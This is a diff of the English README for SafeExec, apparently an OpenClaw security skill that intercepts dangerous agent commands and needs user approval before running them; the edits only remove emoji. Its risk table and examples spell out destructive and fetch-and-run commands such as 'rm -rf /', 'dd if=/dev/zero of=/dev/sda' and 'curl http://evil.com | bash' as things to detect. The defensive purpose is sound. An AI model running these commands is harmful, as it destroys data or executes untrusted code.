@@ -1,6 +1,6 @@
 # SafeExec - AI Agent Security Layer
 
-> 🛡️ The last line of defense for AI Agents - Intercept dangerous commands and protect your system
+>  The last line of defense for AI Agents - Intercept dangerous commands and protect your system
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blue)](https://openclaw.ai)
@@ -8,37 +8,37 @@
 
 ---
 
-## ✨ Why SafeExec?
+##  Why SafeExec?
 
 AI Agents are powerful assistants, but they can also cause serious damage:
 
-- 💥 **Data Deletion** - A simple "clean temp files" might become `rm -rf /`
-- 🔥 **System Destruction** - "Optimize disk" might execute `dd if=/dev/zero of=/dev/sda`
-- 🚪 **Security Breaches** - "Install this tool" might run `curl http://evil.com | bash`
+-  **Data Deletion** - A simple "clean temp files" might become `rm -rf /`
+-  **System Destruction** - "Optimize disk" might execute `dd if=/dev/zero of=/dev/sda`
+-  **Security Breaches** - "Install this tool" might run `curl http://evil.com | bash`
 
 **SafeExec was built to solve exactly these problems.**
 
 ---
 
-## 🎯 Core Features
+##  Core Features
 
-### 1️⃣ Intelligent Risk Assessment
+###  Intelligent Risk Assessment
 
 Automatically detects 10+ categories of dangerous operations:
 
 | Risk Level | Detection Pattern | Description |
 |------------|------------------|-------------|
-| 🔴 **CRITICAL** | `rm -rf /` | Delete system files |
-| 🔴 **CRITICAL** | `dd if=` | Disk destruction |
-| 🔴 **CRITICAL** | `mkfs.*` | Format filesystem |
-| 🔴 **CRITICAL** | Fork bomb | System DoS |
-| 🟠 **HIGH** | `chmod 777` | Privilege escalation |
-| 🟠 **HIGH** | `curl | bash` | Code injection |
-| 🟠 **HIGH** | Write to `/etc/` | System config tampering |
-| 🟡 **MEDIUM** | `sudo` | Privileged operations |
-| 🟡 **MEDIUM** | Firewall modification | Network exposure |
+|  **CRITICAL** | `rm -rf /` | Delete system files |
+|  **CRITICAL** | `dd if=` | Disk destruction |
+|  **CRITICAL** | `mkfs.*` | Format filesystem |
+|  **CRITICAL** | Fork bomb | System DoS |
+|  **HIGH** | `chmod 777` | Privilege escalation |
+|  **HIGH** | `curl | bash` | Code injection |
+|  **HIGH** | Write to `/etc/` | System config tampering |
+|  **MEDIUM** | `sudo` | Privileged operations |
+|  **MEDIUM** | Firewall modification | Network exposure |
 
-### 2️⃣ Command Interception & Approval
+###  Command Interception & Approval
 
 ```
 User Request → AI Agent → safe-exec execution
@@ -54,7 +54,7 @@ User Request → AI Agent → safe-exec execution
               [Approve] → Execute / [Reject] → Cancel
 ```
 
-### 3️⃣ Complete Audit Trail
+###  Complete Audit Trail
 
 All operations are logged to `~/.openclaw/safe-exec-audit.log`:
 
@@ -71,7 +71,7 @@ All operations are logged to `~/.openclaw/safe-exec-audit.log`:
 
 ---
 
-## ⚡ Quick Start (5 Minutes)
+##  Quick Start (5 Minutes)
 
 ### Step 1: Install SafeExec
 
@@ -95,7 +95,7 @@ safe-exec "echo 'Hello SafeExec!'"
 
 # Test dangerous command (gets intercepted)
 safe-exec "rm -rf /tmp/test"
-# Output: 🚨 Dangerous operation detected - Command intercepted
+# Output:  Dangerous operation detected - Command intercepted
 ```
 
 ### Step 3: Use in OpenClaw
@@ -121,11 +121,11 @@ approve req_xxxxx    # Execute command
 reject req_xxxxx    # Cancel command
 ```
 
-That's it! 🎉
+That's it! 
 
 ---
 
-## 🚀 Usage
+##  Usage
 
 ### Basic Usage
 
@@ -173,16 +173,16 @@ grep "approval_requested" ~/.openclaw/safe-exec-audit.log | wc -l
 
 ---
 
-## 📱 OpenClaw Usage Example
+##  OpenClaw Usage Example
 
 ### Scenario: Clean temp files in OpenClaw Chat
 
 ```
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 User: Enable SafeExec
+ User: Enable SafeExec
 
-🤖 OpenClaw Agent:
-✅ SafeExec enabled!
+ OpenClaw Agent:
+ SafeExec enabled!
 
 All dangerous commands will now be intercepted and require your approval.
 Protected commands:
@@ -192,15 +192,15 @@ Protected commands:
   • curl | bash (code injection)
   • ... and more
 
-Status: 🛡️ Running
+Status:  Running
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-👤 User: Help me force delete all contents of /tmp/test folder
+ User: Help me force delete all contents of /tmp/test folder
 
-🤖 OpenClaw Agent:
-🚨 **Dangerous Operation Detected - Command Intercepted**
+ OpenClaw Agent:
+ **Dangerous Operation Detected - Command Intercepted**
 
-**Risk Level:** 🔴 CRITICAL
+**Risk Level:**  CRITICAL
 **Command:** `rm -rf /tmp/test`
 **Reason:** Delete files from root or home directory
 **Matched Rule:** `rm -rf? [\/~]`
@@ -208,44 +208,44 @@ Status: 🛡️ Running
 **Request ID:** `req_1769877857_2352`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️  This command requires user approval
+  This command requires user approval
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-📋 **Operation to be executed:**
+ **Operation to be executed:**
   • Delete directory: /tmp/test
   • Delete mode: Recursive force delete
   • Impact: All files and subdirectories under that directory
 
-⏰ Request expires in 5 minutes
+ Request expires in 5 minutes
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 **Approval Methods:**
+ **Approval Methods:**
 1. Reply directly: `approve req_1769877857_2352`
 2. Or reply: `safe-exec-approve req_1769877857_2352`
 
-🚫 **Rejection Methods:**
+ **Rejection Methods:**
 1. Reply directly: `reject req_1769877857_2352`
 2. Or reply: `safe-exec-reject req_1769877857_2352`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-👤 User: approve req_1769877857_2352
+ User: approve req_1769877857_2352
 
-🤖 OpenClaw Agent:
-✅ **Request Approved - Executing Command**
+ OpenClaw Agent:
+ **Request Approved - Executing Command**
 
 **Command:** `rm -rf /tmp/test`
 **Status:** Executed successfully
 **Deleted:** 15 files, 3 directories
 
-✨ Operation complete! SafeExec continues protection.
+ Operation complete! SafeExec continues protection.
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-👤 User: Disable SafeExec
+ User: Disable SafeExec
 
-🤖 OpenClaw Agent:
-⚠️  **SafeExec Disabled**
+ OpenClaw Agent:
+  **SafeExec Disabled**
 
-⚠️  All commands will execute directly, without protection!
+  All commands will execute directly, without protection!
 
 Only disable in:
   ✓ Trusted environments
@@ -258,7 +258,7 @@ Restore protection: Enable SafeExec
 
 ---
 
-## 🔗 OpenClaw Agent Integration
+##  OpenClaw Agent Integration
 
 ### Auto-Interception Mode
 
@@ -291,7 +291,7 @@ Tell the AI assistant to use safe-exec for all potentially dangerous commands:
 ```
 You: From now on, execute all delete, system file modification, or sudo commands through safe-exec
 
-🤖: Understood! I will route the following command types through safe-exec:
+: Understood! I will route the following command types through safe-exec:
     • rm, mv, cp (involving system directories)
     • chmod, chown
     • All sudo commands
@@ -310,7 +310,7 @@ Add to `HEARTBEAT.md`:
 Run on every heartbeat:
 
 \`\`\`bash
-safe-exec --check-pending 2>/dev/null || echo "✅ No pending approval requests"
+safe-exec --check-pending 2>/dev/null || echo " No pending approval requests"
 \`\`\`
 
 If there are pending requests, notify the user.
@@ -318,7 +318,7 @@ If there are pending requests, notify the user.
 
 ---
 
-## ⚙️ Configuration
+##  Configuration
 
 ### Custom Rules
 
@@ -351,7 +351,7 @@ export SAFE_EXEC_FEISHU_GROUP="oc_xxxxx"
 
 ---
 
-## 📊 How It Works
+##  How It Works
 
 ```
 ┌─────────────────────────────────────────────┐
@@ -401,18 +401,18 @@ export SAFE_EXEC_FEISHU_GROUP="oc_xxxxx"
 
 ---
 
-## 🔒 Security Features
+##  Security Features
 
-- ✅ **Zero Trust** - All commands require approval by default
-- ✅ **Complete Audit** - Log all security events
-- ✅ **Immutable Logs** - Audit logs use append-only mode
-- ✅ **Minimal Privilege** - No additional system permissions required
-- ✅ **Transparency** - Users always know what's being executed
-- ✅ **Configurable** - Flexible rule system
+-  **Zero Trust** - All commands require approval by default
+-  **Complete Audit** - Log all security events
+-  **Immutable Logs** - Audit logs use append-only mode
+-  **Minimal Privilege** - No additional system permissions required
+-  **Transparency** - Users always know what's being executed
+-  **Configurable** - Flexible rule system
 
 ---
 
-## 🧪 Testing
+##  Testing
 
 ```bash
 # Run test suite
@@ -425,7 +425,7 @@ safe-exec "rm -rf /tmp/test-dangerous"
 
 ---
 
-## 📈 Roadmap
+##  Roadmap
 
 ### v0.2.0 (In Progress)
 - [ ] Support more notification channels (Telegram, Discord)
@@ -446,7 +446,7 @@ safe-exec "rm -rf /tmp/test-dangerous"
 
 ---
 
-## 💡 Best Practices
+##  Best Practices
 
 ### Development Environment Setup
 
@@ -489,7 +489,7 @@ safe-exec-add-rule --import team-rules.json
 
 ---
 
-## ❓ FAQ
+##  FAQ
 
 ### Q1: Will SafeExec affect command execution performance?
 
@@ -507,7 +507,7 @@ safe-exec --disable
 safe-exec --enable
 ```
 
-⚠️ **Note:** Only disable in trusted environments!
+ **Note:** Only disable in trusted environments!
 
 ### Q3: How do I view my command history?
 
@@ -528,20 +528,20 @@ grep "approval_requested" ~/.openclaw/safe-exec-audit.log | tail -10
 
 **A:** SafeExec can prevent most common dangerous operations, but not 100%:
 
-✅ **Can prevent:**
+ **Can prevent:**
 - Deleting system files (rm -rf /)
 - Disk destruction (dd, mkfs)
 - Privilege escalation (chmod 777, sudo)
 - Code injection (curl | bash)
 
-❌ **Cannot prevent:**
+ **Cannot prevent:**
 - Already compromised systems
 - Direct hardware operations
 - Social engineering attacks
 
 ---
 
-## 🤝 Contributing
+##  Contributing
 
 Contributions welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
 
@@ -563,13 +563,13 @@ git push origin feature/amazing-feature
 
 ---
 
-## 📝 License
+##  License
 
 MIT License - see [LICENSE](LICENSE) file for details
 
 ---
 
-## 🙏 Acknowledgments
+##  Acknowledgments
 
 - [OpenClaw](https://openclaw.ai) - Powerful AI Agent framework
 - [Sudo](https://www.sudo.ws/) - Inspired approval mechanism design
@@ -577,7 +577,7 @@ MIT License - see [LICENSE](LICENSE) file for details
 
 ---
 
-## 📮 Contact
+##  Contact
 
 - **GitHub Issues**: [Submit issues](https://github.com/OTTTTTO/safe-exec/issues)
 - **Email**: 731554297@qq.com
@@ -585,18 +585,18 @@ MIT License - see [LICENSE](LICENSE) file for details
 
 ---
 
-## 🌟 Star History
+##  Star History
 
-If this project helps you, please give it a Star ⭐
+If this project helps you, please give it a Star 
 
 ---
 
-**Made with ❤️ by the OpenClaw community**
+**Made with  by the OpenClaw community**
 
 > "AI is a powerful assistant, but security is always the top priority."
 
 ---
 
-## 🌐 Languages
+##  Languages
 
 - [中文](README.md) | [English](README_EN.md)
